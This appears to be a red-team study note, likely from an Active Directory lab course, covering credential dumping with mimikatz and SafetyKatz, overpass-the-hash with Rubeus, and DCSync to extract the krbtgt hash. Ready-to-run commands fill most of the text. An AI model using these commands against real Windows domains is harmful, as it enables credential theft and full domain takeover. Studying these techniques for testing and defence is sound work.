`mimikatz` can be used to extract credentials, tickets, replay credentials, play with AD security and many more interesting stuff.

It is one of the most used red team tools and for this reason it is very very fingerprinted.

There are various tools that implement mimikatz furll ot partial mimikatz features.

To download it: [https://github.com/ParrotSec/mimikatz]

To dump credentials using mimikatz we can run:
- `mimikatz.exe -Command '"sekurlsa::ekeys"'`


we can use safetyktz (minidump of lsass and PELoader to run mimikatz)
- `SafetyKatz.exe "sekurlsa::ekeys"`

To download [https://github.com/GhostPack/SafetyKatz]

From linux we can use `impacket`


# OverPass-The-Hash attack (OPTH)
After extracting the credentials we can use thi attack to generatr tokens from hashes or keys.
- We need to run it as administrator.

### SafetyKatz
`SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256key extracted> /run:cmd.exe" "exit"`
- This command starts a process with logon type 9 (same as runas /netonly).
- We use here the `administrator` credentials

### Rubeus
We can use also rubeus.
- `Rubeus.exe asktgt /user:<username ex:administartor> /rc4:<ntlmhash> /ptt`
	- It doesn't need elevation

- `Rubeus.exe asktgt /user:<username ex:administartor> /aes256:<aes256key /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
	- Thi needs elevation because opens a cmd


# DCSync
if we want to extract credentials form the DC without code execution on it, we can use DCSync

To use DCSync feature for getting krbtgt hash we can execute this command with Domain Admin privileges in the dcorp domain:
- `SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"` 

To run DCSync we need by default Domain Admins, Enterprise Admins or Domain Controller privileges.




